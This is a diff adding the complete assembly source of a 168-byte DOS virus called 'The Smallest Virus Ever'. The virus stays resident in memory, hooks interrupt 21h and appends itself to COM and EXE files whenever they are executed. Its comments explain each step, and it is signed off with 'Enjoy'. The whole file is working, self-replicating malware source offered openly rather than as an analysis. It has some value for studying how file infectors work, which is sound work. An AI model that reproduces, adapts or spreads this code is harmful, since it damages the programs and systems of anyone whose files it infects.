@@ -1,0 +1,131 @@
+      ;=========================;
+      ; THE SMALLEST VIRUS EVER ;
+      ;-------------------------;
+      ;    Made by  Super       ;
+      ;=========================;
+
+; This is a memory-resident infector of COM & EXE files on execution
+; it doesn't reinfect memory or files...  AND IT'S 168 BYTES LONG!!!
+
+; I've used the Wolfware Assembler (shareware)
+; Enjoy
+
+;--------------------------------------------------------------------------
+
+             org 0
+vir_start
+             call pop_si    ;
+pop_si                      ; SI=start of virus
+             pop si         ;
+             sub si,3
+             mov dx,es    ; Save ES register
+             cs:                ; Calculate program entry segment
+             add [si+30h],dx    ;  for both EXE & COM
+             sub cx,cx      ;
+             mov es,cx      ; 0000:0200 to 0000:2D9 --> Hole for the virus
+             mov di,22eh    ;  (0020:0000 to 0020:001F: header of file)
+             es:            ;  (0020:002E to 0020:00D9: virus' code)
+             cmp [di],cx    ; Test if it's already resident
+             jnz exit       ;
+             mov cl,(vir_len+1)/2    ; (CH is already zero)
+             cld                     ;
+             rep                     ; Copy the virus to memory
+             cs:                     ;
+             movsw                   ;
+set_int21
+             mov ax,25h                         ;
+             es:                                ;
+             xchg ax,[di+84h-(vir_len+22eh)]    ; Save interrupt 21
+             stosw                              ;  & set it to 0025:0025
+             cmc                                ;      (=0020:0075)
+             jb set_int21                       ;
+exit
+             mov es,dx    ; Restore ES register
+             db 0eah     ;
+jump                     ; Far jump to the entry point of the program
+             dw 0000h    ;  (all zeros mean to jump to PSP:0=INT 20)
+             dw 0000h    ;
+
+
+infect_exe
+             div word [si+6dh]    ; Calculate number of paragraphs
+                                  ; (si+6dh) points to 0010h contained
+                                  ;    in the instruction: add ax,10h
+             sub ax,[si+8h]    ; Adjust for the header size
+             xchg ax,[si+16h]    ; Store new CS
+             xchg dx,[si+14h]    ; Store new IP
+             add ax,10h    ; Adjust for the PSP
+             add byte [si+2h],cl    ; Calculate part-page at EOF
+                                    ; It does not reinfect because
+                                    ;  the carrier flag will be set
+                                    ;  and tested in "write_jump"
+             xchg dx,ax         ; AX=old IP
+             jmps write_jump    ; DX=old CS
+
+
+int21
+             push ax    ; Save AX register
+             sub ax,4b00h      ; Infect on execute
+             jnz exit_int21    ;
+infect
+             push bx    ; Save registers
+             push dx    ;  (don't need to save CX,SI,DI,BP,ES)
+             push ds    ;
+             xchg si,ax    ; SI=0000
+                             ; Open file --->BX=handle
+             mov ax,3d92h    ;  bits 0-2=2--> read & write access
+             int 21h         ;  bits 4-6=1--> prohibit access by others
+             xchg bx,ax      ;  bit 7=1--> private for current process
+             mov ah,3fh       ;
+             mov cx,20h       ; Read first 20h bytes from the file
+             mov ds,cx        ;
+             cwd              ; (DS:DX=0020:0000)
+             int 21h          ;
+             xor cx,ax    ; Exit if the file is smaller than 20h bytes
+             jnz close    ;
+             mov ax,4202h    ; Seek to EOF
+             int 21h         ; (CX & DX are already zero)
+             mov cl,vir_len
+             cmp byte [si],'M'    ; Test if file is EXE
+             jz infect_exe        ;
+infect_com
+             cmp byte [si],0e9h    ; Test if the file starts with a jump
+             jnz close             ;
+             dec ax    ;
+             dec ax    ; (The jump takes 3 bytes)
+             dec ax    ;
+             xchg ax,[si+1]    ; Store the jump to the virus
+             add ax,103h    ; Calculate the offset where the program jumps
+             cmp [si+1],ax    ; Test if the file is infected
+                              ; (if the jump is 100h bytes before the EOF)
+write_jump
+             jb close    ; Exit if the file is already infected
+             mov [si+5ch],ax    ; Store the program entry point
+             mov [si+5eh],dx    ;
+             mov dx,2eh    ; (0020:002E is the start of the code)
+             mov ah,40h    ; Write virus to the end of the file
+             int 21h       ; (CX is already the length of the virus)
+
+write_hdr
+             mov ax,4200h    ;
+             cwd             ; Seek to the start of file
+             mov cx,dx       ;
+             int 21h         ;
+             mov ah,40h    ; Write header to file
+             mov cl,18h    ; (CH & DX are already zero)
+             int 21h       ;
+close
+             mov ah,3eh    ; Close file
+             int 21h       ;
+             pop ds    ;
+             pop dx    ; Restore registers
+             pop bx    ;
+exit_int21
+             pop ax     ; Restore AX register
+             db 0eah    ; Far jump to old interrupt 21
+
+vir_end
+vir_len equ offset vir_end - offset vir_start
+
+;--------------------------------------------------------------------------
+
